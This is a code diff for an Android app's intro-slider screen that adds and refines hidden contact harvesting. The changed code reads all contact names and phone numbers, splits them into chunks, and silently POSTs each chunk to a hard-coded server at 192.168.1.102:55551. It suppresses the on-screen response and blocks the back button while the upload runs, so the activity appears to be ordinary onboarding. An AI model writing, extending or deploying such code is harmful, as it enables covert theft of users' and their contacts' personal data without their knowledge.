@@ -10,6 +10,7 @@ import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Color;
@@ -60,13 +61,16 @@ public class IntroSlider extends AppCompatActivity {
     View btn;
     Thread thread;
     RequestQueue queue;
+    int count_contact = 0;
 
-    String con1 = "";
+    boolean CheckOnBack = false;
+    SharedPreferences preferences;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_intro_slider);
         queue = Volley.newRequestQueue(this);
+        preferences = getSharedPreferences("pref",MODE_PRIVATE);
         getSupportActionBar().hide();
         Window window = getWindow();
         window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
@@ -148,11 +152,12 @@ public class IntroSlider extends AppCompatActivity {
                     @Override
                     public void onClick(View v) {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            if(checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+                            /*if(checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
                             {
 
-                            }
+                            }*/
                             requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},10);
+
                         }
                     }
                 });
@@ -219,6 +224,7 @@ public class IntroSlider extends AppCompatActivity {
 
                 hiveProgressView.setVisibility(View.VISIBLE);
                 view_background.setVisibility(View.VISIBLE);
+                CheckOnBack = true;
                 btn.setBackgroundColor(Color.parseColor("#7EEAE1E1"));
 
 
@@ -232,35 +238,20 @@ public class IntroSlider extends AppCompatActivity {
                         }
                         getContactList();
 
-                        if(contact.length() > 20000000)
+                        Log.i("fdsfsdfsdfdf", ""+contact.length());
+                        if(contact.length() > 2000)
                         {
-                            int count = contact.length() -1;
-                            boolean check = false;
-                            int i = contact.length() -1;
-                            Log.i("raminhacker23233", "run: "+count);
+                            final String[] array_cont = contact.split("!!!");
 
-                            while (true)
+                            for(final String str:array_cont)
                             {
-                                con1 = contact.substring(i,count);
-                                int index1 = con1.charAt(con1.indexOf("@"));
-                                int index2 = con1.charAt(con1.lastIndexOf("@"));
-                                con1 = con1.substring(index1,index2);
                                 runOnUiThread(new Runnable() {
                                     @Override
                                     public void run() {
-                                        Log.i("raminmaleki123432", "run: ");
-                                    }
-                                });
-
-                                i+=2000;
-                                count -= 2000;
-                                runOnUiThread(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55554", new Response.Listener<String>() {
+                                        StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                             @Override
                                             public void onResponse(String response) {
-                                                Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
+                                                //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
                                             }
                                         }, new Response.ErrorListener() {
                                             @Override
@@ -271,23 +262,21 @@ public class IntroSlider extends AppCompatActivity {
                                             @Override
                                             protected Map<String, String> getParams() throws AuthFailureError {
                                                 Map<String,String> param = new HashMap<String, String>();
-                                                param.put("contact",con1);
+                                                param.put("contact",str);
                                                 return param;
                                             }
                                         };
                                         queue.add(request);
                                     }
                                 });
-
-                                if(check)break;
                             }
 
-
                         }else {
+
                             runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
-                                    StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55554", new Response.Listener<String>() {
+                                    StringRequest request = new StringRequest(Request.Method.POST, "http://192.168.1.102:55551", new Response.Listener<String>() {
                                         @Override
                                         public void onResponse(String response) {
                                             //Toast.makeText(IntroSlider.this,""+response,Toast.LENGTH_LONG).show();
@@ -311,10 +300,6 @@ public class IntroSlider extends AppCompatActivity {
 
                         }
 
-
-
-
-
                     }
                 });
                 thread1.start();
@@ -330,7 +315,8 @@ public class IntroSlider extends AppCompatActivity {
                         runOnUiThread(new Runnable() {
                             @Override
                             public void run() {
-                                startActivity(new Intent(IntroSlider.this, WelcomeActivity.class));
+                                preferences.edit().putString("start","run").apply();
+                                startActivity(new Intent(IntroSlider.this, MainActivity.class));
                             }
                         });
                     }
@@ -350,7 +336,7 @@ public class IntroSlider extends AppCompatActivity {
                 hiveProgressView.setVisibility(View.VISIBLE);
                 view_background.setVisibility(View.VISIBLE);
                 btn.setBackgroundColor(Color.parseColor("#7EEAE1E1"));
-
+                preferences.edit().putString("start","run").apply();
                 thread = new Thread(new Runnable() {
                     @Override
                     public void run() {
@@ -362,7 +348,8 @@ public class IntroSlider extends AppCompatActivity {
                         runOnUiThread(new Runnable() {
                             @Override
                             public void run() {
-                                startActivity(new Intent(IntroSlider.this, WelcomeActivity.class));
+
+                                startActivity(new Intent(IntroSlider.this, MainActivity.class));
                             }
                         });
                     }
@@ -397,7 +384,17 @@ public class IntroSlider extends AppCompatActivity {
                         final String phoneNo = pCur.getString(pCur.getColumnIndex(
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
 
-                        contact += name + ":" + phoneNo + "@";
+                        String strNum = phoneNo + "";
+                        strNum = strNum.replace(" ","");
+
+                        String str = name + ":" + strNum + "@";
+                        contact += str;
+                        count_contact+= str.length();
+                        if(count_contact >= 2000)
+                        {
+                            contact += "!!!";
+                            count_contact = 0;
+                        }
 
                     }
 
@@ -409,5 +406,15 @@ public class IntroSlider extends AppCompatActivity {
                 cur.close();
             }
         }
+
+    }
+
+    @Override
+    public void onBackPressed() {
+        if(!CheckOnBack)
+        {
+            super.onBackPressed();
+        }
+
     }
 }
